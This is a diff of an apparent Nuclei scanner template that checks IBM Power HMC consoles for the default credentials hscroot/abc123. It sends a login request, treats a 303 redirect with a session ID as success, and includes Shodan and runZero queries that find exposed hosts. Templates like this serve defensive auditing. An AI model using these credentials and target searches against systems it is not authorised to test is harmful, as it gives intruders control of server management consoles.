@@ -1,5 +1,4 @@
 id: ibm-hmc-default-login
-
 info:
   name: IBM Power HMC - Default Login
   author: R3S OST
@@ -13,32 +12,29 @@ info:
     cvss-score: 8.3
     cwe-id: CWE-522
   metadata:
-    verified: true
+    runzero-match: service["favicon.ico.image.mmh3"] == "262502857"
     max-request: 1
     shodan-query: http.favicon.hash:262502857
-  tags: default-login,ibm,hmc
-
+    verified: true
+  tags: default-login,hmc,ibm,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - condition: and
+        dsl:
+          - len(body) == 0
+          - status_code == 303
+          - 'contains(header, ''Location: /hmc/connect;jsessionid='')'
+        type: dsl
+    payloads:
+      password:
+        - abc123
+      username:
+        - hscroot
+    raw:
       - |
         POST /hmc/j_security_check HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         j_username={{username}}&j_password={{password}}&j_newConsole=Dashboard&j_security_check=Log+in
-
-    payloads:
-      username:
-        - hscroot
-      password:
-        - abc123
-    attack: pitchfork
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "len(body) == 0"
-          - "status_code == 303"
-          - "contains(header, 'Location: /hmc/connect;jsessionid=')"
-        condition: and
-# digest: 490a004630440220178b1718907a5418912425a6eaf4d800282d333d1e173e3a3ccb676d045d2b8302201ddf4df0bd77fec9c8ff23fa464b18adb1bf71f967090c5873ce00d211164e6b:922c64590222798bb761d5b6d8e72950
